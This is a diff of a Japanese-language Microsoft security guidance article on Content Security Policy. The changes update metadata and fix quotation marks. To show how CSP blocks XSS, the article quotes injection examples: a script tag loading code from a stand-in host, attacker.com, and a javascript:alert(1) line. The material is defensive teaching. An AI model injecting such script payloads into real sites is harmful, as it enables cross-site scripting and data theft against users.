@@ -15,12 +15,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: 986bed758229d639bb40d0803f7be4a89a0f6e49
-ms.sourcegitcommit: 13a289ba57cfae728831e6d38b7f82dae165e59d
+ms.openlocfilehash: fedf8118f5581056e40594419c17f074c339a61b
+ms.sourcegitcommit: 0b1a4101d575e28af0f0d161852b57d82c9b2a7e
 ms.translationtype: HT
 ms.contentlocale: ja-JP
-ms.lasthandoff: 08/09/2019
-ms.locfileid: "68934809"
+ms.lasthandoff: 10/30/2019
+ms.locfileid: "73161546"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>セキュリティ フレーム:構成管理 | 対応策 
 | 製品/サービス | 記事 |
@@ -44,7 +44,7 @@ ms.locfileid: "68934809"
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
 | **参照**              | [コンテンツ セキュリティ ポリシーの概要](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[コンテンツ セキュリティ ポリシー リファレンス](https://content-security-policy.com/)、[セキュリティ機能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[コンテンツ セキュリティ ポリシーの概要](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[CSP が使用可能か](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **手順** | <p>コンテンツ セキュリティ ポリシー (CSP) は、W3C 標準の多層防御セキュリティ メカニズムです。このポリシーを使用すると、Web アプリケーション所有者が、自身のサイトに埋め込まれたコンテンツを制御できます。 CSP は、Web サーバー上で HTTP 応答ヘッダーとして追加され、ブラウザーによってクライアント側で適用されます。 これはホワイトリスト ベースのポリシーで、Web サイトが、信頼されたドメインのセットを宣言できます。このドメインから、JavaScript などのアクティブ コンテンツを読み込むことができます。</p><p>CSP のセキュリティ上の利点を次に示します。</p><ul><li>**XSS に対する保護:** ページが XSS に対して脆弱である場合、攻撃者がそれを悪用する方法は 2 つあります。<ul><li>`<script>malicious code</script>` を挿入する。 このエクスプロイトは、CSP の基本制限 1 により動作しません</li><li>`<script src=”http://attacker.com/maliciousCode.js”/>` を挿入する。 攻撃者が制御するドメインは、ドメインの CSP のホワイトリストに追加されないため、このエクスプロイトは動作しません</li></ul></li><li>**データ流出の制御:** Web ページの悪意のあるコンテンツが外部 Web サイトに接続して、データを盗もうとすると、CSP によって接続が中断されます。 接続先ドメインは、CSP のホワイトリストに追加されないためです</li><li>**クリックジャッキングに対する防御:** クリックジャッキングは、敵が正規の Web サイトを偽装して、ユーザーに UI 要素を強制的にクリックさせる攻撃方法です。 現時点では、クリックジャッキングに対する防御は、X-Frame-Options 応答ヘッダーを構成することで実現します。 すべてのブラウザーがこのヘッダーを使用しているわけではありません。今後は、CSP がクリックジャッキングに対する標準的な防御方法になります</li><li>**リアルタイム攻撃レポート:** CSP 対応の Web サイトがインジェクション攻撃を受けると、Web サーバーで構成されているエンドポイントへの通知が自動的にトリガーされます。 このように、CSP は、リアルタイムの警告システムとして機能します。</li></ul> |
+| **手順** | <p>コンテンツ セキュリティ ポリシー (CSP) は、W3C 標準の多層防御セキュリティ メカニズムです。このポリシーを使用すると、Web アプリケーション所有者が、自身のサイトに埋め込まれたコンテンツを制御できます。 CSP は、Web サーバー上で HTTP 応答ヘッダーとして追加され、ブラウザーによってクライアント側で適用されます。 これはホワイトリスト ベースのポリシーで、Web サイトが、信頼されたドメインのセットを宣言できます。このドメインから、JavaScript などのアクティブ コンテンツを読み込むことができます。</p><p>CSP のセキュリティ上の利点を次に示します。</p><ul><li>**XSS に対する保護:** ページが XSS に対して脆弱である場合、攻撃者がそれを悪用する方法は 2 つあります。<ul><li>`<script>malicious code</script>` を挿入する。 このエクスプロイトは、CSP の基本制限 1 により動作しません</li><li>`<script src="http://attacker.com/maliciousCode.js"/>` を挿入する。 攻撃者が制御するドメインは、ドメインの CSP のホワイトリストに追加されないため、このエクスプロイトは動作しません</li></ul></li><li>**データ流出の制御:** Web ページの悪意のあるコンテンツが外部 Web サイトに接続して、データを盗もうとすると、CSP によって接続が中断されます。 接続先ドメインは、CSP のホワイトリストに追加されないためです</li><li>**クリックジャッキングに対する防御:** クリックジャッキングは、敵が正規の Web サイトを偽装して、ユーザーに UI 要素を強制的にクリックさせる攻撃方法です。 現時点では、クリックジャッキングに対する防御は、X-Frame-Options 応答ヘッダーを構成することで実現します。 すべてのブラウザーがこのヘッダーを使用しているわけではありません。今後は、CSP がクリックジャッキングに対する標準的な防御方法になります</li><li>**リアルタイム攻撃レポート:** CSP 対応の Web サイトがインジェクション攻撃を受けると、Web サーバーで構成されているエンドポイントへの通知が自動的にトリガーされます。 このように、CSP は、リアルタイムの警告システムとして機能します。</li></ul> |
 
 ### <a name="example"></a>例
 サンプル ポリシー: 
@@ -57,7 +57,7 @@ Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analyt
 インライン スクリプトが実行されません。 インライン スクリプトの例を次に示します 
 ```javascript
 <script> some Javascript code </script>
-Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
+Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
 javascript:alert(1);
 ```
 
